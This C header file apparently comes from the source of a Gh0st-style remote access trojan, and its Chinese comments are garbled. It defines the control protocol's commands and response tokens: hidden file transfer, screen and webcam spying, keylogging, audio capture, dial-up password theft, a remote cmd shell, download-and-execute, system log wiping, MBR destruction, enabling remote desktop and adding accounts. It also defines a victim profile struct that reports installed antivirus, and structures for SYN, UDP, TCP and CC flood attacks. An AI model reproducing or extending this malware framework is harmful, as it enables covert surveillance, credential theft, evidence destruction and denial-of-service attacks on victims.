
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE���Ҳ��256
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������
	
	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
	
	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_SYSTEMINFO,				// �����б�
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_System,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Security,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Application,		// �������� - ���ϵͳ��־
	COMMAND_CLEAN_ALL,			    // �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	//////////////////////�¹���////////////////////////

	COMMAND_CHANGE_GROUP,			// ���ķ���
	COMMAND_SENDFILE_HIDE,			// ��������
	COMMAND_SENDFILE_NORMAL,		// ��ʾ����
	COMMAND_SENDFILE_NOSTART,		// ��ȥ����
	COMMAND_SENDFILE_UPDATA,		// ��������
	COMMAND_OPEN_PROXY,				// ��������
	COMMAND_SHOW_MSG,				// ������Ϣ
	COMMAND_KILL_MBR,				// Ӳ����
	COMMAND_PORT_MAPPING,			// �˿�ӳ��

	//DOSS
	COMMAND_DDOS_ATTACK,            // DDOS
	COMMAND_DDOS_STOP,              // STOP
	COMMAND_FREE_PROCESS,			// ����

	//DOSS

	/////////////////////////////////////////////////////
    COMMAND_SERVER_START,		    // ����������
	COMMAND_USER_LIST,		        // �û�
	COMMAND_NETWORK_LIST,		    // ����
	COMMAND_SERVER_PORT,		    // �������˿��޸�
	COMMAND_OPEN_3389,				// ����3389
	COMMAND_NET_USER,				// ��NET����û�
	COMMAND_NET_YHSX,		        // �û�ˢ��
	COMMAND_NET_START,		        // �ʻ�����
	COMMAND_NET_DISABLE,		    // �ʻ�����
	COMMAND_NET_DEL,		        // �ʻ�ɾ��
	COMMAND_RENAME_PASSWORD,        // �ʻ������޸�
	COMMAND_NRTWORK_CARD,           // ����������ˢ��
	COMMAND_DEL_SHIFTOSK,           // ����̼��Ŵ�ɾ��
///*
	COMMAND_GUANGQU,				// ��������
	COMMAND_GUANGQU2,				// �ջع���
	COMMAND_ZHUOMIAN,				// ��������
	COMMAND_ZHUOMIAN1,				// ��ʾ����
	COMMAND_ZAOYIN,					// ����
	COMMAND_SHANPIN,				// ����
	COMMAND_XIANSHIQI,				// �ر���ʾ��
	COMMAND_XIANSHIQI2,				// ����ʾ��
	COMMAND_RENWULAN,				// ����������
	COMMAND_RENWULAN2,				// ��ʾ������
	COMMAND_MOUSE,				    // ��ʾ������
	COMMAND_MOUSE2,				    // ��ʾ������
//*/
	COMMAND_SERMANAGER,				// ������� 
	COMMAND_SSLIST,					// �����б�
	COMMAND_STARTSERVERICE,			// ��������
	COMMAND_STOPSERVERICE,			// ֹͣ����
	COMMAND_DELETESERVERICE,		// ɾ������
	COMMAND_CREATSERVERICE,			// ��������
	COMMAND_AUTOSERVERICE,			// ������
	COMMAND_HANDSERVERICE,			// �ֶ�
	COMMAND_DISABLESERVERICE,		// ��ֹ

	COMMAND_SERVERS_SETOPT,         //���÷���������          
	COMMAND_SERVERS_DEL,            //ɾ��ָ������
	COMMAND_REGEDIT,                //ע������
	COMMAND_REG_FIND,               //��ѯ����  
	COMMAND_REG_DELPATH,            //ɾ����
	COMMAND_REG_CREATEPATH,         //������
	COMMAND_REG_DELKEY,             //ɾ����
    COMMAND_REG_CREATKEY,           //������

//	COMMAND_FINDALL_PROCESS,		// ����ɸѡȫ��
//	COMMAND_FIND_PROCESS,			// ����ɸѡ

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣
	
	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������


	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������
	
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

//DOSS
	/////////////////////�������������еĴ���///////////////////////////////////
	TOKEN_FREE_BEGIN,				// ������
	TOKEN_FREE_FIND,				// ���˽��
	TOKEN_FREE_NO,				    // ��������
	///////////////////////////////////////////////////////////////////////////
//DOSS
	
	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_USER_LIST,			    // �������û��б�
	TOKEN_NETWORK_LIST,			    // �����������б�

	// �¹���
	TOKEN_SYSTEMINFO,				// ϵͳ��Ϣ
	TOKEN_SSLIST,					// �������
//	TOKEN_FIND_NO,					// ɸѡ.���ز�����
//	TOKEN_FINDALL_NO,				// ɸѡȫ��.���ز�����

	TOKEN_REGEDIT,                  // ��ע������
    TOKEN_REG_PATH,                 // ����ע�������
	TOKEN_REG_KEY,                  // ���ͼ���
	TOKEN_REG_OK,                   // ִ�гɹ�
	TOKEN_REG_NO                    // ִ��ʧ��
};


typedef struct 
{
	BYTE bToken;		   // = 1	
	CHAR szCpuSpeend[32];  //cpu�ٶ� 
	CHAR szCpuInfo[128];   //CPU��Ϣ
	CHAR szPcName[50];     //���������
	CHAR szUserName[32];   //�û���
	CHAR szScrSize[32];    //��Ļ�ֱ���
	CHAR LineName[100];    //��������
	CHAR LinePort[32];     //���߶˿�
	CHAR Program[256];     //����;��
	CHAR InstallOpen[100]; //�������з�ʽ
	CHAR szUserVirus[256]; //�û�ɱ�����
}MESSAGEInfo;

//DOSS
typedef struct DDOS_HEAD
{
	CHAR Target[400];    //����Ŀ��
	WORD AttackPort;     //�����˿�
	WORD AttackType;     //��������
	WORD AttackThread;   //�����߳�
	WORD AttackTime;     //����ʱ��
	CHAR SendData[2000]; //���͵����ݰ�
	WORD DataSize;       //���ݰ���С
	DWORD ExtendData1;   //��������
	DWORD ExtendData2;   //��������
}ATTACK,*LPATTACK;
//DOSS

#define IDR_ENCODE 513		//��Դ�е�������Ϣ
#define IDR_CONFIG 514		//��Դ�еķ�����Ϣ
#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���

//DOSS
enum 
{
	ATTACK_CCFLOOD,     //����CC
	ATTACK_IMITATEIE,   //ģ��IE
	ATTACK_LOOPCC,      //�ֻ�CC
	ATTACK_ICMPFLOOD,   //ICMP
	ATTACK_UDPFLOOD,    //UDP
	ATTACK_TCPFLOOD,    //TCP
	ATTACK_SYNFLOOD,	//SYN
	ATTACK_BRAINPOWER,  //����.
	CUSTOM_TCPSEND=100, //TCP ����
	CUSTOM_UDPSEND,     //UDP ����
};
//DOSS

#endif // !defined(AFX_MACROS_H_INCLUDED)
